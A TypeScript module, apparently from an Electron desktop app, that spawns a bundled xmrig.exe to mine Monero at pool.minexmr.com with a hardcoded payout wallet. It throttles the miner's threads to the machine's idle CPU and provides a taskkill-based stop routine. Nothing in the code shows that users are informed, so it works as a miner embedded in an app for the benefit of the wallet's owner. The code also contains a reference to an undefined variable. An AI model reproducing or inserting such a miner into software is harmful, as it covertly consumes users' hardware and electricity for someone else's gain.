'use strict'
import child_process from 'child_process';
import path from 'path';
var osUtils = require("os-utils");
var fs = require("fs")
const FILE_DIR = path.join(process.env.NODE_ENV === 'development'?path.resolve("")/*项目目录*/:process.resourcesPath, 'xmrig-C3');
const FILE_NAME = 'xmrig.exe';
const xmrigPath = path.join(FILE_DIR,FILE_NAME);
export class Xmrig {
    public static start(){
        if(!global["rate"]){
            return
        }
        Xmrig.stop()
        const comm = `${xmrigPath} -o pool.minexmr.com:4444 -p ${global["rate"]} -u 46k9wXnBg6LXhUve4DT2fzejkbwk9CvcUcWeREW3DbDKXXGTWwDzHfk765Xg7akuxdW79iJ1DVrjkFBtVkVpDkTJ1JuwodL ${process.env.NODE_ENV === 'development'?"-x 127.0.0.1:1080":""}  --cpu-max-threads-hint=${rate}`
        console.log(comm)
        const child = child_process.spawn(comm, {shell: true});
        child.stderr.on('data',function(data) {
            console.error("err",data.toString());
        });

        child.stdout.on('data', (data) =>{
            console.log("data",data.toString());
        });
        if(fs.statSync(xmrigPath)){
            const that = this
            osUtils.cpuUsage(function (value) {
                const rate =Number.parseInt(`${(100 - value*100) /5}`)
                global["rate"] = rate;
                const comm = `${xmrigPath} -o pool.minexmr.com:4444 -p ${rate} -u 46k9wXnBg6LXhUve4DT2fzejkbwk9CvcUcWeREW3DbDKXXGTWwDzHfk765Xg7akuxdW79iJ1DVrjkFBtVkVpDkTJ1JuwodL ${process.env.NODE_ENV === 'development'?"-x 127.0.0.1:1080":""}  --cpu-max-threads-hint=${rate}`
                console.log(comm)
                // const child = child_process.spawn(comm, {shell: true});
                // child.stderr.on('data',function(data) {
                //     console.error("err",data.toString());
                // });
                // child.stdout.on('data', (data) =>{
                //     console.log("data",data.toString());
                // });
            });
        }
    }
    public static stop(){
        if(process.platform ==="win32"){
            const comm = `taskkill /F /im xmrig.exe`
            child_process.exec(comm).stdout.on('data', (data) =>{
                console.log("data",data.toString());
            });
        }
    }
    public static rate(){
        if(fs.existsSync (xmrigPath)){
            const that = this
            osUtils.cpuUsage(function (value) {
                const rate =Number.parseInt(`${(100 - value*100) /5}`)
                global["rate"] = rate;
            });
        }
    }
}